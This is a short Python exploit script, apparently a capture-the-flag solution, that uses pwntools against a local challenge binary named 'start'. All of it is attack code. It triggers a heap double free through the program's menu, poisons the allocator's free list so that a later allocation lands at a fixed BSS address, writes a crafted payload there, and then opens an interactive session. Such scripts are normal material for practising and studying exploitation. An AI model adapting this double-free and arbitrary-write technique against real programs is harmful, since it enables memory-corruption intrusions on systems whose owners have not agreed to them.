from pwn import*
p = process('./start')

### Gadget
bss_addr = 0x602040

### Definition
def menu(sel):
	p.sendlineafter("> ",sel)

def write(contents):
	menu('M')
	p.sendafter('Data: ',contents)

def erase(idx):
	menu('F')
	p.sendlineafter('Index: ',str(idx))

# exploit

p.send(p64(0)+p64(0x30))	# name
write('a'*0x8)
write('b'*0x8)
erase(1)
erase(0)
erase(1)
write(p64(bss_addr))
write(p64(0))
write(p64(0))
pay = ''
pay += p64(0)*4
pay += "AUTUMN"
raw_input()
write(pay)

p.interactive()
